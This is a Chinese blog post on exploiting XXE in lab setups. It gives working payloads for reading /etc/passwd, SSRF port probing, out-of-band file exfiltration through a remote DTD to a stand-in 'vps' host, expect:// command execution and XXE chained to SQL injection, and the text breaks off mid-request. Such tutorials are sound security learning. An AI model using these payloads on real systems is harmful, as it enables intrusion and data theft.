<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>xxe利用 | 愤怒的小恐龙</title><meta name="keywords" content="漏洞学习,xxe"><meta name="author" content="愤怒的小恐龙"><meta name="copyright" content="愤怒的小恐龙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言今天在项目上遇到一个xxe，很久没打xxe了就想着总结一下，加深自己对xxe漏洞的认识。 什么是XXEXXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载">
<meta property="og:type" content="article">
<meta property="og:title" content="xxe利用">
<meta property="og:url" content="http://www.fndxkl.xyz/2021/08/16/xxe/index.html">
<meta property="og:site_name" content="愤怒的小恐龙">
<meta property="og:description" content="前言今天在项目上遇到一个xxe，很久没打xxe了就想着总结一下，加深自己对xxe漏洞的认识。 什么是XXEXXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.fndxkl.xyz/img1/t3.jpg">
<meta property="article:published_time" content="2021-08-16T11:32:00.000Z">
<meta property="article:modified_time" content="2021-08-18T11:44:04.864Z">
<meta property="article:author" content="愤怒的小恐龙">
<meta property="article:tag" content="漏洞学习">
<meta property="article:tag" content="xxe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.fndxkl.xyz/img1/t3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.fndxkl.xyz/2021/08/16/xxe/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-08-18 19:44:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="wizard-scene"><div class="wizard-objects"><div class="wizard-square"></div><div class="wizard-circle"></div><div class="wizard-triangle"></div></div><div class="wizard"><div class="wizard-body"></div><div class="wizard-right-arm"><div class="wizard-right-hand"></div></div><div class="wizard-left-arm"><div class="wizard-left-hand"></div></div><div class="wizard-head"><div class="wizard-beard"></div><div class="wizard-face"><div class="wizard-adds"></div></div><div class="wizard-hat"><div class="wizard-hat-of-the-hat"></div><div class="wizard-four-point-star --first"></div><div class="wizard-four-point-star --second"></div><div class="wizard-four-point-star --third"></div></div></div></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/CyberChef/"><i class="fa-fw fas fa-tags"></i><span> 加解密</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://www.fndxkl.xyz/img1/t3.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">愤怒的小恐龙</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/CyberChef/"><i class="fa-fw fas fa-tags"></i><span> 加解密</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">xxe利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-16T11:32:00.000Z" title="发表于 2021-08-16 19:32:00">2021-08-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-18T11:44:04.864Z" title="更新于 2021-08-18 19:44:04">2021-08-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xxe/">xxe</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天在项目上遇到一个xxe，很久没打xxe了就想着总结一下，加深自己对xxe漏洞的认识。</p>
<h4 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h4><p>XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p>
<h4 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h4><p>知己知彼才能百战百胜，只有知道相应的基础，才能更加了解这个漏洞产生</p>
<ul>
<li>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#XML声明</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">#文档类型定义DTD</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">    &lt;!ELEMENT to       (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT from     (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT heading  (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT body     (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">#文档元素</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Hello,word!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
<p>DTD实体分为内部实体和外部实体</p>
<ul>
<li>内部实体 <!ENTITY a "xxe"> </li>
<li>外部实体 <!ENTITY a SYSTEM "xxe"></li>
</ul>
<p>如图：<br>内部实体</p>
<p><img src="/images/pasted-106.png" alt="upload successful"></p>
<p>外部实体</p>
<p><img src="/images/pasted-107.png" alt="upload successful"></p>
<ul>
<li>内外部实体又可分为 一般实体 和 参数实体一般实体的声明语法：<!ENTITY  a   "b"> 引用实体的方式：&amp;a；</li>
<li>参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY  % a  "b">        引用实体的方式：%a；</li>
</ul>
<p>根据定义构造外部参数实体：<br><img src="/images/pasted-105.png" alt="upload successful"></p>
<h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4><p>docker搜索xxe相关镜像包，然后pull   rrodrigo/xxelab 镜像包</p>
<p><img src="/images/pasted-109.png" alt="upload successful"><br>点击登录，使用burp抓包</p>
<p><img src="/images/pasted-110.png" alt="upload successful"><br>可以看到<a href="mailto:&#x31;&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;">&#x31;&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;</a>在返回包中显示，证明emali这个点可以回显<br>我们使用file协议去任意文件读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;process.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:45678</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.101 Safari&#x2F;537.36</span><br><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 172</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">	&lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;111&lt;&#x2F;name&gt;&lt;tel&gt;222&lt;&#x2F;tel&gt;&lt;email&gt;&amp;a;&lt;&#x2F;email&gt;&lt;password&gt;333&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-111.png" alt="upload successful"><br>可以看到/etc/passwd 已经在返回包中显示出来<br>那其他点就不能进行xxe了吗？<br>答案是否定的，虽然其他点并没有回显但是是存在Blind XXE的<br>我们使用dnslog进行测试</p>
<p><img src="/images/pasted-112.png" alt="upload successful"><br>dns成功接收到</p>
<p>接下来就说说xxe利用的几种场景：</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>xxe可以通过http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF（服务器端请求伪造）</p>
<p><img src="/images/pasted-113.png" alt="upload successful"><br>探测未开放的端口</p>
<p><img src="/images/pasted-114.png" alt="upload successful"></p>
<p>我们可以根据响应时间/长度来判断该端口是否已被开启。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;process.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:45678</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.101 Safari&#x2F;537.36</span><br><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 173</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">	&lt;!ENTITY a SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&#x2F;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;a;&lt;&#x2F;name&gt;&lt;tel&gt;222&lt;&#x2F;tel&gt;&lt;email&gt;21&lt;&#x2F;email&gt;&lt;password&gt;333&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<h4 id="通过DTD窃取文件"><a href="#通过DTD窃取文件" class="headerlink" title="通过DTD窃取文件"></a>通过DTD窃取文件</h4><p>本地使用phpstudy开启http服务<br>根目录放入一个php文件，代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$dom &#x3D; new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在服务器上新建一个1.dtd文件，并开启http服务端口为9999</p>
<p><img src="/images/pasted-116.png" alt="upload successful"><br>文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:12345?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>接着再使用python3开启一个用于接收的http服务，端口要跟1.dtd代码中的端口对应</p>
<p><img src="/images/pasted-117.png" alt="upload successful"><br>接着提交poc</p>
<p><img src="/images/pasted-118.png" alt="upload successful"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>这样服务就可以接收到读取的d:/test.txt文件内容了</p>
<p><img src="/images/pasted-119.png" alt="upload successful"></p>
<p>尝试读取一下c:\windows\win.ini<br>修改1.dtd</p>
<p><img src="/images/pasted-120.png" alt="upload successful"><br>按照刚刚的步骤</p>
<p><img src="/images/pasted-121.png" alt="upload successful"><br>成功读取</p>
<h5 id="整个调用过程："><a href="#整个调用过程：" class="headerlink" title="整个调用过程："></a>整个调用过程：</h5><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的1.dtd ，有点类似于将 1.dtd 包含进来，然后 %int 调用 1.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
<h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><p>如果想命令执行则需要PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，条件比较苛刻</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里就不进行复现，别的没啥 我的expect扩展装不上去，菜哭了。。。。</p>
<h4 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h4><p>刚刚已经演示通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的朋友应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.1.0）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
<p>如果想要更深一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p>
<p><img src="/images/pasted-122.png" alt="upload successful"></p>
<h5 id="进阶利用一-攻击内网web服务sql注入"><a href="#进阶利用一-攻击内网web服务sql注入" class="headerlink" title="进阶利用一:攻击内网web服务sql注入"></a>进阶利用一:攻击内网web服务sql注入</h5><p>虚拟机使用phpstudy搭建一个key师傅的dorabox,这里设置域名为<a target="_blank" rel="noopener" href="http://www.111.com/">www.111.com</a></p>
<p><img src="/images/pasted-123.png" alt="upload successful"><br>可以看到使用payload:+and+1=2+union+select+1,database(),3–+<br>是可以获取database()的，真实情况是需要探测到端口以后，一点一点读取web并构造，如何读取可以参考DTD窃取文件，这里就直接演示获取database()这一步</p>
<p>我们在服务器上修改一下1.dtd文件的payload</p>
<p><img src="/images/pasted-124.png" alt="upload successful"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;www.111.com:81&#x2F;sql_injection&#x2F;sql_num.php?id&#x3D;1+and+1&#x3D;2+union+select+1,database(),3--+&amp;submit&#x3D;submit&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;vps:12345?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>还是跟dtd窃取文件一样 开启相应的web服务,接着使用burp发送数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;xml.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:81</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.101 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 132</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps:9999&#x2F;1.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<p>这时服务器接收到请求</p>
<p><img src="/images/pasted-125.png" alt="upload successful"></p>
<p><img src="/images/pasted-126.png" alt="upload successful"><br>在12345端口成功接收到读取的数据包，使用base64解密</p>
<p><img src="/images/pasted-127.png" alt="upload successful"><br>可以看到成功获取到database()</p>
<p>当然也可以使用探测的方法进行盲注<br>如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;xml.php HTTP&#x2F;1.1</span><br><span class="line">Host: www.xml.com:81</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.101 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY a SYSTEM &quot;http:&#x2F;&#x2F;www.111.com:81&#x2F;sql_injection&#x2F;sql_num.php?id&#x3D;1+and+if(1&#x3D;1,1,exp(710))&#x3D;1--+&amp;submit&#x3D;submit&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&amp;a;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<p>payload:1+and+if(1=1,1,exp(710))=1–+</p>
<p><img src="/images/pasted-128.png" alt="upload successful"><br>payload:1+and+if(1=2,1,exp(710))=1–+</p>
<p><img src="/images/pasted-129.png" alt="upload successful"><br>payload:and+if(mid(database(),7,1)=’t’,1,exp(710))=1</p>
<p><img src="/images/pasted-130.png" alt="upload successful"></p>
<p>相同的还有 xxe攻击内网的stust2,weblogic等等，利用方式都是类似的，这里就不演示了，实战中不能如果突破边界，可以利用次漏洞攻击内网出网机器并反弹shell,说不定就稳了呢。</p>
<h5 id="进阶利用二-内网ftp服务"><a href="#进阶利用二-内网ftp服务" class="headerlink" title="进阶利用二:内网ftp服务"></a>进阶利用二:内网ftp服务</h5><p>刚刚我看了xxe可以使用的协议，其中包含了ftp协议<br><img src="/images/pasted-131.png" alt="upload successful"><br>可以看到次协议使用的方式<a href="ftp://username:password:ip:port/xxxx">ftp://username:password:ip:port/xxxx</a><br>使用phpstudy开启ftp服务，并传入一个1.txt内容为xxe,ftp</p>
<p><img src="/images/pasted-133.png" alt="upload successful"><br>接着构造一下ftp利用方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;xml.php HTTP&#x2F;1.1</span><br><span class="line">Host: www.xml.com:81</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.101 Safari&#x2F;537.36</span><br><span class="line">Accept: 